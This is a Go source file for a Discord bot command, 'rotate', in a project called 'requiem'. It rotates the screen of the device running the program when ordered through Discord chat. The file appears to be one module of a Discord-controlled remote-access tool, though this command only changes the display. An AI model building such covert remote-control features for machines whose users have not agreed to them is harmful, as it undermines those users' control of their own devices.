package commands

import (
	"fmt"
	"strings"

	"requiem/funcs"
	"requiem/utils"

	"github.com/bwmarrin/discordgo"
)

func (*RotateCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	content := strings.Join(args, " ")

	var err error

	if utils.HasFlag(content, "0") {
		err = funcs.RotateScreen(0)
	} else if utils.HasFlag(content, "90") {
		err = funcs.RotateScreen(1)
	} else if utils.HasFlag(content, "180") {
		err = funcs.RotateScreen(2)
	} else if utils.HasFlag(content, "270") {
		err = funcs.RotateScreen(3)
	} else {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
		return
	}

	if err == nil {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully rotated screen.", msg.Reference())
	} else {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to rotate screen - %s", err), msg.Reference())
	}
}

func (*RotateCommand) Name() string {
	return "rotate"
}

func (*RotateCommand) Info() string {
	return "Rotates the device display."
}

type RotateCommand struct{}
